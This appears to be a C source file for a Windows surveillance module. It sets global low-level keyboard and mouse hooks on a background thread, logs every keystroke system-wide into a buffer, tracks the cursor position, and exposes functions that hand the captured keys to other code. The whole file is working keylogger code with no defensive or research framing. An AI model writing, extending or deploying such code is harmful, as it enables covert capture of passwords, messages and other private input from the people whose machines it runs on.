#include "surveillance.h"
#include <process.h>

HHOOK keyboard_hook = NULL;
HHOOK mouse_hook = NULL;

char key_buffer[1024] = "";
CRITICAL_SECTION key_lock;

int mouse_x = 0;
int mouse_y = 0;

LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && (wParam == WM_KEYDOWN || wParam == WM_SYSKEYDOWN)) {
        KBDLLHOOKSTRUCT *kbdStruct = (KBDLLHOOKSTRUCT *)lParam;
        DWORD vkCode = kbdStruct->vkCode;
        
        char key_char[16] = "";
        
        // Basic mapping for alphanumeric keys
        if (vkCode >= 0x30 && vkCode <= 0x39) {
            snprintf(key_char, sizeof(key_char), "%c", (char)vkCode);
        } else if (vkCode >= 0x41 && vkCode <= 0x5A) {
            snprintf(key_char, sizeof(key_char), "%c", (char)vkCode);
        } else if (vkCode == VK_SPACE) {
            snprintf(key_char, sizeof(key_char), "[SPACE] ");
        } else if (vkCode == VK_RETURN) {
            snprintf(key_char, sizeof(key_char), "[ENTER] ");
        } else if (vkCode == VK_BACK) {
            snprintf(key_char, sizeof(key_char), "[BACKSPACE] ");
        } else if (vkCode == VK_SHIFT || vkCode == VK_LSHIFT || vkCode == VK_RSHIFT) {
            // ignore
        } else {
            snprintf(key_char, sizeof(key_char), "[%lu] ", vkCode);
        }

        EnterCriticalSection(&key_lock);
        if (strlen(key_buffer) + strlen(key_char) < sizeof(key_buffer) - 1) {
            strcat(key_buffer, key_char);
        }
        LeaveCriticalSection(&key_lock);
    }
    return CallNextHookEx(keyboard_hook, nCode, wParam, lParam);
}

LRESULT CALLBACK MouseProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode >= 0 && wParam == WM_MOUSEMOVE) {
        MSLLHOOKSTRUCT *mouseStruct = (MSLLHOOKSTRUCT *)lParam;
        mouse_x = mouseStruct->pt.x;
        mouse_y = mouseStruct->pt.y;
    }
    return CallNextHookEx(mouse_hook, nCode, wParam, lParam);
}

unsigned __stdcall hook_thread(void* arg) {
    HINSTANCE hInstance = GetModuleHandle(NULL);
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, hInstance, 0);
    mouse_hook = SetWindowsHookEx(WH_MOUSE_LL, MouseProc, hInstance, 0);

    MSG msg;
    while (GetMessage(&msg, NULL, 0, 0)) {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    
    UnhookWindowsHookEx(keyboard_hook);
    UnhookWindowsHookEx(mouse_hook);
    return 0;
}

void init_global_hooks(void) {
    InitializeCriticalSection(&key_lock);
    _beginthreadex(NULL, 0, hook_thread, NULL, 0, NULL);
}

void get_buffered_keys(char* out_buffer, int max_len) {
    EnterCriticalSection(&key_lock);
    strncpy(out_buffer, key_buffer, max_len);
    out_buffer[max_len - 1] = '\0';
    // Clear buffer after reading
    key_buffer[0] = '\0';
    LeaveCriticalSection(&key_lock);
}

void get_mouse_coordinates(int* x, int* y) {
    *x = mouse_x;
    *y = mouse_y;
}
